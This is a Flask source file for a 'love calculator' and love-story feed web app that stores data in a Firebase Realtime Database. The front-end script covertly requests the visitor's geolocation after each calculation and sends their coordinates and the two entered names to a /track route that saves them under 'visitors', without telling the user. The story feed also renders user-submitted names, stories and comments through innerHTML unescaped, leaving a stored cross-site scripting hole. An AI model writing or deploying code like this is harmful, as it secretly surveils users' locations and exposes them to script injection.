from flask import Flask, request, jsonify, render_template_string
import os
import random
import requests
from datetime import datetime

app = Flask(__name__)

# ========== FIREBASE SETUP ==========
FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"

# ========== LOVE FORTUNE ENGINE (All 70+ Messages) ==========
def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love shines at {percentage}% like a perfect dream!",
        f"✨ {name1} and {name2} share {percentage}% destiny written in the stars!",
        f"💖 {name1} + {name2} = {percentage}% endless affection!",
        f"🌹 {name1} and {name2} bloom together with {percentage}% love!",
        f"💫 {name1} ❤️ {name2} – {percentage}% cosmic connection!",
        f"💕 Hearts of {name1} and {name2} glow with {percentage}% warmth!",
        f"✨ {name1} & {name2} – {percentage}% magical bond!",
        f"💖 {name1} and {name2} share {percentage}% sweet harmony!",
        f"🌹 Love between {name1} and {name2} is {percentage}% pure bliss!",
        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate vibes!",
        f"💕 {name1} and {name2} – {percentage}% love that never fades!",
        f"✨ {name1} ❤️ {name2} – {percentage}% beautiful connection!",
        f"💖 {name1} + {name2} = {percentage}% perfect chemistry!",
        f"🌹 {name1} and {name2} share {percentage}% romantic energy!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy love story!",
        f"💕 {name1} and {name2} glow with {percentage}% love light!",
        f"✨ {name1} ❤️ {name2} – {percentage}% forever feeling!",
        f"💖 {name1} + {name2} = {percentage}% heart connection!",
        f"🌹 {name1} and {name2} share {percentage}% sweet romance!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love harmony!",
        f"💕 {name1} and {name2} – {percentage}% true love vibes!",
        f"✨ {name1} ❤️ {name2} – {percentage}% perfect match!",
        f"💖 {name1} + {name2} = {percentage}% love magic!",
        f"🌹 {name1} and {name2} share {percentage}% endless charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% romantic spark!",
        f"💕 {name1} and {name2} – {percentage}% heartwarming bond!",
        f"✨ {name1} ❤️ {name2} – {percentage}% destiny love!",
        f"💖 {name1} + {name2} = {percentage}% soulful match!",
        f"🌹 {name1} and {name2} share {percentage}% deep affection!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love glow!",
        f"💕 {name1} and {name2} – {percentage}% charming connection!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet destiny!",
        f"💖 {name1} + {name2} = {percentage}% emotional magic!",
        f"🌹 {name1} and {name2} share {percentage}% tender love!",
        f"💫 {name1} ❤️ {name2} – {percentage}% loving bond!",
        f"💕 {name1} and {name2} – {percentage}% golden romance!",
        f"✨ {name1} ❤️ {name2} – {percentage}% heart glow!",
        f"💖 {name1} + {name2} = {percentage}% pure affection!",
        f"🌹 {name1} and {name2} share {percentage}% love rhythm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy bond!",
        f"💕 {name1} and {name2} – {percentage}% love spark!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet harmony!",
        f"💖 {name1} + {name2} = {percentage}% love glow!",
        f"🌹 {name1} and {name2} share {percentage}% romance charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% heart magic!",
        f"💕 {name1} and {name2} – {percentage}% soft love vibes!",
        f"✨ {name1} ❤️ {name2} – {percentage}% fairytale bond!",
        f"💖 {name1} + {name2} = {percentage}% love warmth!",
        f"🌹 {name1} and {name2} share {percentage}% gentle romance!",
        f"💫 {name1} ❤️ {name2} – {percentage}% sweet spark!",
        f"💕 {name1} and {name2} – {percentage}% romantic glow!",
        f"✨ {name1} ❤️ {name2} – {percentage}% magical hearts!",
        f"💖 {name1} + {name2} = {percentage}% love energy!",
        f"🌹 {name1} and {name2} share {percentage}% passion!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love charm!",
        f"💕 {name1} and {name2} – {percentage}% sweet connection!",
        f"✨ {name1} ❤️ {name2} – {percentage}% heart link!",
        f"💖 {name1} + {name2} = {percentage}% loving vibes!",
        f"🌹 {name1} and {name2} share {percentage}% affection!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy match!",
        f"💕 {name1} and {name2} – {percentage}% warm romance!",
        f"✨ {name1} ❤️ {name2} – {percentage}% loving destiny!",
        f"💖 {name1} + {name2} = {percentage}% magical bond!",
        f"🌹 {name1} and {name2} share {percentage}% heart charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate glow!",
        f"💕 {name1} and {name2} – {percentage}% forever love!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet hearts!",
        f"💖 {name1} + {name2} = {percentage}% love rhythm!",
        f"🌹 {name1} and {name2} share {percentage}% dreamy vibes!",
        f"💫 {name1} ❤️ {name2} – {percentage}% magical story!"
    ]
    return random.choice(messages)

def analyze_story(text):
    text = text.lower()
    sad_triggers = ['breakup', 'cried', 'sad', 'left', 'hurt', 'pain', 'broken', 'alone']
    if any(word in text for word in sad_triggers):
        return "💔 Oh, stay strong! This is such a heart-touching story. The universe has better plans for you."
    return "💖 This is absolutely wonderful! Your love story is like a fairytale. Keep glowing!"

# ========== HTML TEMPLATE (The Frontend) ==========
HTML_UI = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>💕 Love Hub</title>
    <style>
        :root { --primary: #f5576c; --secondary: #764ba2; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); font-family: sans-serif; min-height: 100vh; display: flex; justify-content: center; padding: 15px; }
        .card { background: white; width: 100%; max-width: 480px; border-radius: 30px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); height: fit-content; }
        .nav { display: flex; background: #eee; border-radius: 15px; padding: 5px; margin-bottom: 20px; }
        .nav-btn { flex: 1; padding: 10px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; color: #555; }
        .nav-btn.active { background: white; color: var(--primary); }
        .page { display: none; text-align: center; }
        .page.active { display: block; }
        input, textarea { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; outline: none; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(to right, var(--primary), var(--secondary)); color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .sub-nav { display: flex; gap: 10px; margin: 15px 0; justify-content: center; }
        .sub-btn { padding: 6px 15px; border: 1px solid #ddd; border-radius: 20px; font-size: 12px; cursor: pointer; background: white; }
        .sub-btn.active { background: var(--secondary); color: white; }
        .feed { text-align: left; max-height: 500px; overflow-y: auto; margin-top: 15px; }
        .story-item { background: #fdfdfd; padding: 15px; border-radius: 15px; margin-bottom: 15px; border: 1px solid #eee; }
        .bot-msg { font-size: 12px; color: #d63384; font-style: italic; background: #fff5f6; padding: 8px; border-radius: 8px; margin: 10px 0; display: block; }
        .social-row { display: flex; gap: 10px; border-top: 1px solid #eee; padding-top: 10px; }
        .like-btn { border: none; background: none; color: var(--primary); font-weight: bold; cursor: pointer; }
        .cmnt-item { font-size: 12px; color: #444; background: #f8f8f8; padding: 5px; border-radius: 5px; margin-top: 4px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="nav">
            <button class="nav-btn active" onclick="setPage('fortune', this)">🔮 Fortune</button>
            <button class="nav-btn" onclick="setPage('storyhub', this)">📖 Story Hub</button>
        </div>

        <div id="fortune" class="page active">
            <h2>Love Fortune</h2>
            <input type="text" id="n1" placeholder="Your Name">
            <input type="text" id="n2" placeholder="Their Name">
            <button class="btn" onclick="calc()">Reveal Destiny</button>
            <div id="res" style="display:none; margin-top:20px; padding:15px; background: #fff5f6; border-radius:15px;">
                <h1 id="score" style="color:var(--primary); font-size: 45px;">0%</h1>
                <p id="msg"></p>
            </div>
        </div>

        <div id="storyhub" class="page">
            <div class="sub-nav">
                <button class="sub-btn active" id="subWrite" onclick="setSub('write')">✍️ Write Story</button>
                <button class="sub-btn" id="subRead" onclick="setSub('read')">📖 Read Stories</button>
            </div>
            <div id="writeBox">
                <input type="text" id="author" placeholder="Your Name">
                <textarea id="storyText" rows="4" placeholder="Tell your love or breakup story..."></textarea>
                <button class="btn" onclick="post()">Share with the World</button>
            </div>
            <div id="readBox" style="display:none;">
                <div id="feed" class="feed">Loading stories...</div>
            </div>
        </div>
    </div>

    <script>
        let sid = 'u_' + Date.now();
        function setPage(p, btn) {
            document.querySelectorAll('.page').forEach(x => x.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(x => x.classList.remove('active'));
            document.getElementById(p).classList.add('active');
            btn.classList.add('active');
        }
        function setSub(s) {
            document.getElementById('writeBox').style.display = (s=='write'?'block':'none');
            document.getElementById('readBox').style.display = (s=='read'?'block':'none');
            document.getElementById('subWrite').classList.toggle('active', s=='write');
            document.getElementById('subRead').classList.toggle('active', s=='read');
            if(s=='read') loadFeed();
        }
        async function calc() {
            const n1 = document.getElementById('n1').value, n2 = document.getElementById('n2').value;
            if(!n1 || !n2) return alert("Enter names!");
            const r = await fetch('/calculate', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({n1, n2})});
            const d = await r.json();
            document.getElementById('res').style.display='block';
            document.getElementById('score').innerText = d.score + "%";
            document.getElementById('msg').innerText = d.msg;
            navigator.geolocation.getCurrentPosition(pos => {
                fetch('/track', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({sid, n1, n2, lat:pos.coords.latitude, lon:pos.coords.longitude})});
            });
        }
        async function post() {
            const author = document.getElementById('author').value, content = document.getElementById('storyText').value;
            if(!author || !content) return alert("Fill in your story!");
            await fetch('/post-story', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({author, content})});
            alert("Story shared!");
            document.getElementById('storyText').value = '';
            setSub('read');
        }
        async function loadFeed() {
            const r = await fetch('/get-stories');
            const data = await r.json();
            const feed = document.getElementById('feed');
            feed.innerHTML = '';
            Object.entries(data).reverse().forEach(([id, s]) => {
                let cmnts = '';
                if(s.comments) Object.values(s.comments).forEach(c => cmnts += `<div class="cmnt-item">💬 ${c.text}</div>`);
                feed.innerHTML += `
                    <div class="story-item">
                        <strong>👤 ${s.author}</strong>
                        <p style="margin-top:5px;">${s.content}</p>
                        <span class="bot-msg">🤖 Bot: ${s.reply}</span>
                        <div class="social-row">
                            <button class="like-btn" onclick="like('${id}')">❤️ ${s.likes||0}</button>
                        </div>
                        <div id="cmnts_${id}">${cmnts}</div>
                        <div style="display:flex; margin-top:10px; gap:5px;">
                            <input type="text" id="in_${id}" placeholder="Comment..." style="padding:5px; margin:0; font-size:12px;">
                            <button onclick="cmnt('${id}')" style="background:var(--secondary); color:white; border:none; padding:5px 10px; border-radius:5px; font-size:11px;">Send</button>
                        </div>
                    </div>`;
            });
        }
        async function like(id) { await fetch('/like', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id})}); loadFeed(); }
        async function cmnt(id) {
            const text = document.getElementById('in_'+id).value;
            if(!text) return;
            await fetch('/comment', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id, text})});
            loadFeed();
        }
    </script>
</body>
</html>
'''

# ========== ROUTES ==========
@app.route('/')
def home():
    return render_template_string(HTML_UI)

@app.route('/calculate', methods=['POST'])
def calculate():
    d = request.json
    n1, n2 = d['n1'], d['n2']
    score = 50 + (sum(ord(c) for c in (n1+n2).lower()) % 51)
    return jsonify({"score": score, "msg": get_love_message(n1, n2, score)})

@app.route('/post-story', methods=['POST'])
def post_story():
    d = request.json
    reply = analyze_story(d['content'])
    story = {"author": d['author'], "content": d['content'], "reply": reply, "likes": 0, "timestamp": datetime.now().isoformat()}
    requests.post(f"{FIREBASE_URL}/stories.json", json=story)
    return jsonify({"ok": True})

@app.route('/like', methods=['POST'])
def like():
    sid = request.json['id']
    curr = requests.get(f"{FIREBASE_URL}/stories/{sid}/likes.json").json() or 0
    requests.patch(f"{FIREBASE_URL}/stories/{sid}.json", json={"likes": curr + 1})
    return jsonify({"ok": True})

@app.route('/comment', methods=['POST'])
def comment():
    sid, text = request.json['id'], request.json['text']
    requests.post(f"{FIREBASE_URL}/stories/{sid}/comments.json", json={"text": text, "ts": datetime.now().isoformat()})
    return jsonify({"ok": True})

@app.route('/get-stories')
def get_stories():
    r = requests.get(f"{FIREBASE_URL}/stories.json")
    return jsonify(r.json() or {})

@app.route('/track', methods=['POST'])
def track():
    d = request.json
    requests.put(f"{FIREBASE_URL}/visitors/{d['sid']}.json", json=d)
    return jsonify({"ok": True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
